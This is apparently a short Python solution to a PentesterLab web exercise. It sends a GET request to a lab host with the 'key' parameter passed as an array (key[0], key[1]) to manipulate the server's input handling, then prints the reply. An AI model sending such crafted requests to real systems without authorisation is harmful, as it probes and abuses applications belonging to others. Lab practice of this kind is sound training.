import requests
import urllib

base = 'http://ptl-271aa698-0671d06f.libcurl.so/'
key1 = 'key[0]'
key2 = 'key[1]'
value1 = 'key'
value2 = 'please'

url = base + 'pentesterlab?' + urllib.parse.quote_plus(key1) + '=' + urllib.parse.quote_plus(value1) + '&' + urllib.parse.quote_plus(key2) + '=' + urllib.parse.quote_plus(value2)

print(url)

rsp = requests.get(url)

print(rsp.text)